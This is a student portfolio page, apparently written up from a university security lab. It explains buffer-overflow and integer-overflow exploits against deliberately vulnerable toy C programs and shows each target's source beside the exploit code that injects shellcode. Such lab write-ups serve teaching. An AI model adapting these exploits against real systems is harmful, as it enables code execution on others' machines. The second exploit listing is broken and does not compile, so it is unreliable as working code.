<!DOCTYPE HTML>
<!--
	Landed by HTML5 UP
	html5up.net | @n33co
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>Eui Won Kim | Snowman</title>
		<meta name="author" content="Eui Won Kim">
		<meta charset="utf-8" />
		<link rel="shortcut icon" href="images/logoblack.png" type="image/x-icon">
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
		<link rel="stylesheet" href="assets/css/main.css" />
	</head>
	<body>
		<div id="page-wrapper">

			<!-- Header -->
				<header id="header">
					<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px"/> </a></h1>

				<nav id="nav">
						<ul>
							<li><a href="about.html"><b>About</b></a></li>
							<li>
								<a href="#"><b>Projects</b></a>
								<ul>
									<li><a href="routie.html">Routie</a></li>
									<li><a href="snowman.html">Study Buddy</a></li>
									<li><a href="web.html">Personal Website</a></li>
									<li><a href="elm.html">Elm</a></li>
									<li><a href="cse.html">Lab Waitlist</a></li>
									<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
										<a href="#" style="display: block;">Internet Security</a>
										<ul style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;" class="dropotron level-1">
											<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&Integer Overflow</a></li>
											<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
											<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China's Great Cannon</a></li>
											<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS & Profile Worm</a></li>
										</ul>
									</li>
									<li><a href="cse.html">Recommendation Algorithm</a></li>
								</ul>
							</li>
							<li><a href="resume.html"><b>Resume</b></a></li>
							<li><a href="contact.html"><b>Contact</b></a></li>

							
						</ul>
					</nav>
				</header>

			<!-- Main -->
				<div id="main" class="wrapper style1">
					<div class="container">
						<header class="major">
							<h2><a><img src="images/security.jpg" height="154px" width="178px" alt="" /></a>
</h2>
							<h2>Buffer Overflow.</h2>
						</header>
						
							<p>For target 1, through gdb we found the buf is allocating 132 bit of memory to the staack so our arg has to be at least [132] +4 to over flow the buffer to where the return address is. We made our arg much bigger [150] and filled the whole arg with the adress of the beinning of the buf 0xbefffc50. Then we copied the shellcode into the beginning of our arg. So now the arg will have shellcode + 0xbefffc50(till end of arg) Now when we run sploit1, the attack string will have the correct shellcode in the beginning and over flow the correct address back to the shellcode. </p>
							<div class="row">
								<div class="6u 12u(xsmall)" style="float: left;">
								<header >
									<h2><br></h2>
									<p>Target</p>
									<pre width="800px"><code style="height: 600px">#include &#60;stdio.h&#62;
#include &#60;stdlib.h&#62;
#include &#60;string.h&#62;

int foo(char *arg)
{
  char buf[127];
  strcpy(buf, arg);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  foo(argv[1]);
  return 0;
}

									</code></pre>
									</header>
								</div>
								<div class="6u 12u(xsmall)" style="float: right;">
								<header >
									<h2> <br></h2>
									<p>Exploit</p>
									<pre width="800px" ><code style="height: 600px">#include &#60;stdint.h&#62;
#include &#60;stdio.h&#62;
#include &#60;stdlib.h&#62;
#include &#60;string.h&#62;
#include &#60;unistd.h&#62;
#include "shellcode.h"
 
#define TARGET "/tmp/target1"
#define OFFSET 132
 
int main(void)
{
    char arg1[OFFSET];
    char buf[OFFSET];
    char *args[] = { TARGET, arg1, NULL };
    char *env[] = { NULL };
    int address = 0xbefffb10;
 
    long *ptr = (long *) buf;
 
    int i;
 
    for (i = 0; i < OFFSET; i++) {
        *(ptr+i) = address;
    }
 
    for(i = 0; i < strlen(shellcode); i++) {
        buf[i] = shellcode[i];
    }
 
    strcpy(arg1,buf);
 
    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");
 
    return 0;
}

									</code></pre>
								</div>
								
								
						
								
						</div>

					</div>
				</div>
				
				<!-- Integer -->
				<div id="main" class="wrapper style1">
					<div class="container">
						<header class="major">
							<h2>Integer Overflow.</h2>
						</header>
				</header>
				
				<p>The bug here is the count &#60; MAX_WIDGETS<br><br> MAX_WIDGETS was defined as 200 so we know that count had to be less than 200 in order to take advantage of the memcpy. The size of struct came out to 40 so our buf size was 40x200 = 8000 bytes. Buf size as [8000]+4. We found the correct negative integer by subtracting INT_MIN + some number that came out to around 8040.<br><br> Then we created a head string which contained the number "-2147483446" and the rest of the string was filled by the same concept in target1. Once this negative number allow us to pass through the bug, the shellcode is executed by jumping back to the beginning of the buf. </p>
							<div class="row">
								<div class="6u 12u(xsmall)" style="float: left;">
								<header >
									<h2><br></h2>
									<p>Target</p>
									<pre width="800px"  ><code style="height: 600px">#include &#60;stdio.h&#62;
#include &#60;stdlib.h&#62;
#include &#60;string.h&#62;
 
struct widget_t {
  double w;
  double x;
  double y;
  double z;
  int count;
};
 
#define MAX_WIDGETS 200
 
int foo(char *in, int count)
{
  struct widget_t buf[MAX_WIDGETS];
 
  if (count &#60; MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));
 
  return 0;
}
 
int main(int argc, char *argv[])
{
  int count;
  char *in;
 
  if (argc != 2)
    {
      fprintf(stderr, "target3: argc != 2\n");
      exit(EXIT_FAILURE);
    }
 
  /*
   * format of argv[1] is as follows:
   *
   * - a count, encoded as a decimal number in ASCII
   * - a comma (",")
   * - the remainder of the data, treated as an array
   *   of struct widget_t
   */
 
  count = (int)strtoul(argv[1], &in, 10);
  if (*in != ',')
    {
      fprintf(stderr, "target3: argument format is [count],[data]\n");
      exit(EXIT_FAILURE);
    }
  in++;                         /* advance one byte, past the comma */
  foo(in, count);
 
  return 0;
}

									</code></pre>
									</header>
								</div>
								<div class="6u 12u(xsmall)" style="float: right;">
								<header >
									<h2> <br></h2>
									<p>Exploit</p>
									<pre width="800px"><code style="height: 600px">#include &#60;stdint.h&#62;
#include &#60;stdio.h&#62;
#include &#60;stdlib.h&#62;
#include &#60;string.h&#62;
#include &#60;unistd.h&#62;
#include "shellcode.h"
 
#define TARGET "/tmp/target1"
#define OFFSET 132
 
int main(void){
    char arg1[140];
    char *args[] = {TARGET, arg1, NULL};
    char*env[] = {NULL};

    int i;
    long * = (long *) arg1;
    for(i = 0; i &#60; 54; i++, ptr++){
        if(i > 51)
            *ptr = ADDY;
        else
            *ptr = 0xffffffff;
    }
    memcpy(arg1, shellcode, sizeof(char) * strlen(shellcode));

}

									</code></pre>
								</div>
								
								
						
								
						</div>

					</div>
				</div>
				

			<!-- Footer -->
				<footer id="footer">
					<ul class="icons">
						<li><a href="https://www.linkedin.com/in/euiwonkim" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
						<li><a href="https://github.com/jeo1kim" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
						<li><a href="mailto:jeo1kim@gmail.com" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
					</ul>
					<ul class="copyright">
						<li>&copy; Awesome Possom. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
						<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></ul>
				</footer>

		</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/jquery.dropotron.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/skel.min.js"></script>
			<script src="assets/js/util.js"></script>
			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
			<script src="assets/js/main.js"></script>

	</body>
</html>